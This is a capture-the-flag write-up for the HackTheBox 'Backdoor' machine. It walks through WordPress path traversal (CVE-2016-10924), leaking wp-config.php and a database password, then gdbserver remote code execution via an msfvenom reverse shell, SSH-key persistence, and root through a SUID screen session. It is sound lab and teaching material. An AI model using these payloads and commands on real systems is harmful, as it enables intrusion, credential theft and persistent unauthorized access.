# Backdoor Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.125 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.125`.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap tells us that "WordPress 5.8.1" is running on port `80`. So, we can scan that with `wpscan`.

### Wordpress (port `80`)

Let's run `wpscan` with `wpscan --url http://10.10.11.125/ --plugins-detection aggressive`. We specify `--plugins-detection aggressive` in order to detect any installed plugins since without plugins will not be detected.

```
[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.125/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.8.2
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:07:17 <============================================================================> (96954 / 96954) 100.00% Time: 00:07:17
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.11.125/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://10.10.11.125/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 21

[+] Finished: Sun Feb 20 21:39:58 2022
[+] Requests Done: 97105
[+] Cached Requests: 41
[+] Data Sent: 26.051 MB
[+] Data Received: 12.991 MB
[+] Memory used: 373.93 MB
[+] Elapsed time: 00:07:30
```

The SQL injection vulnerabilities seem interesting, but the `ebook-download` looks really promising since it was specifically installed on this Wordpress instance while the other vulnerabilities are just due to a slightly old Wordpress version. Going to the [wpscan link for this vulnerability](https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c) tells us that it is `CVE-2016-10924`. Looking on the [plugin's official page](https://wordpress.org/plugins/ebook-download/#developers) we can see that this exploit was fixed in version 1.2. Luckily, according to the `http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt` this site is using version 1.1.

Searching for the actual CVE doesn't find anything that tells us how to exploit it. Searching for "wordpress ebook download 1.1 exploit" brings us to [this exploit-db page](https://www.exploit-db.com/exploits/39575). The proof of concept exploit is `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`. Sur enough, going to `http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php` lets us download the `wp-config.php` file:

```php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */

/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
define('ABSPATH', dirname(__FILE__) . '/');
/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */
$currenthost = "http://".$_SERVER['HTTP_HOST'];
$currentpath = preg_replace('@/+$@','',dirname($_SERVER['SCRIPT_NAME']));
$currentpath = preg_replace('/\/wp.+/','',$currentpath);
define('WP_HOME',$currenthost.$currentpath);
define('WP_SITEURL',$currenthost.$currentpath);
define('WP_CONTENT_URL', $currenthost.$currentpath.'/wp-content');
define('WP_PLUGIN_URL', $currenthost.$currentpath.'/wp-content/plugins');
define('DOMAIN_CURRENT_SITE', $currenthost.$currentpath );
@define('ADMIN_COOKIE_PATH', './');

define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

The mysql database password is in plain text in the configuration, so we now know that: `MQYBJSaD#DxG6qbm`.

### What is running on port `1337`?

I'm assuming that whatever is running on port `1337` is the exploit path since there is nothing else obvious with Wordpress. So, we need to use the path traversal exploit we found to figure out the process on that port.

Searching online for "what is running on this port" finds [this article](https://www.cyberciti.biz/faq/what-process-has-open-linux-port/), which mentions using the `/proc/$pid/` file system to figure out what is running on a certain port: "Under Linux `/proc` includes a directory for each running process (including kernel processes) at `/proc/PID`, containing information about that process, notably including the processes name that opened port."

Reading about [the `proc` filesystem on kernel.org](https://www.kernel.org/doc/html/latest/filesystems/proc.html) shows that there is a `cmdline` file within each process's folder containing command line arguments. So, if we can figure out the process id of what is running on port `1337` we can get the command that was used to start it, which will show us what program is running on that port. We can brute force this using Python: [get_process_id.py](get_process_id.py). I determined the number of `../`'s needed by adding them one by one until I was able to download `/etc/passwd`: `http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd`. In the script we only print output that includes `1337` because the command probably had the port in it. This means all the other processes will be silently ignored.

Running the [get_process_id.py](get_process_id.py) script we find that process id `854` is running `gdbserver`. The complete output from `curl "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/854/cmdline" --output -`: is `../../../../../../proc/854/cmdline../../../../../../proc/854/cmdline../../../../../../proc/854/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>`.

## Foothold

We will exploit `gdbserver` running on port `1337`. We download the literal `gdbserver` binary from the target with `curl "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../usr/bin/gdbserver" --output downloaded_gdbserver`. Now, we can use `strings` and `grep` to find the actual version string in the binary: `strings downloaded_gdbserver | grep version -A 1`. This will match about 12 lines and show that the version is `Ubuntu 9.2-0ubuntu1~20.04`. So, the target is running `gdbserver` version 9.2.

Let's see if there are any easy exploits for this version using `searchsploit gdbserver 9.2`:

```
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)    | linux/remote/50539.py
------------------------------------------------------ ---------------------------------
```

We can copy the exploit to our home directory with `searchsploit -m 50539.py`.

Running `python3 50539.py --help` displays a helpful usage message that walks us through the entire process:

```
Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 50539.py 10.10.10.200:1337 rev.bin
```

We'll do exactly as the exploit code author says and run `msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=40254 PrependFork=true -o rev.bin` to create the shellcode. Then, we will start a listener with netcat: `nc -nlvp 40254` (or use `pwncat-cs -lp 40254`). Finally, we run the exploit with `python3 50539.py 10.10.11.125:1337 rev.bin`... and we get a reverse shell. Nice!

We can now run `cat user.txt` to get the `user.txt` flag.

## Lateral Movement

Let's get some persistance with `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in `pwncat` (or upload the public key to `.ssh/authorized_keys` manually if using netcat).

Let's scan for possible privilege escalation techniques with [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) by running `upload linpeas.sh` in `pwncat` and then running `bash linpeas.sh` on the target.

In the running processing section of the LinPEAS report we see the following:

```
root         830  0.0  0.1   8356  3420 ?        S    Feb20   0:00  _ /usr/sbin/CRON -f
root         851  0.0  0.0   2608  1540 ?        Ss   Feb20   0:10      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
root       90213  0.0  0.0   5476   524 ?        S    04:32   0:00          _ sleep 1
```

LinPEAS highlights this as "95% a privilege escalation vector." (By the way, the box's version of sudo is also vulnerable to `CVE-2021-4034`, but this is a recent exploit and is not the intended escalation technique. HackTheBox might have also patched this method.)

Some quick online searching finds [this article](https://possiblelossofprecision.net/?p=1993) which mentions that we can use the `-x` argument to `screen` and then use the syntax `screen -x <user>/<session_name>` to connect. However, that only works if the `/bin/screen` binary has the SUID bit set. Running `ls -la /bin/screen` shows that it does have the SUID bit set: `-rwsr-xr-x 1 root root 474280 Feb 23  2021 /bin/screen` Additionally, the `screen` help page (`screen --help`) confirms our finding that the `-x` option looks to be what we want:

```
-x            Attach to a not detached screen. (Multi display mode).
```

Run `screen -x root/root` and now we have a root shell. We can run `cat /root/root.txt` to get the `root.txt` flag.

We could now copy over our ssh key to the root user or use `pwncat`'s `run implant.authorized_key key=/home/kali/.ssh/id_rsa` as root.
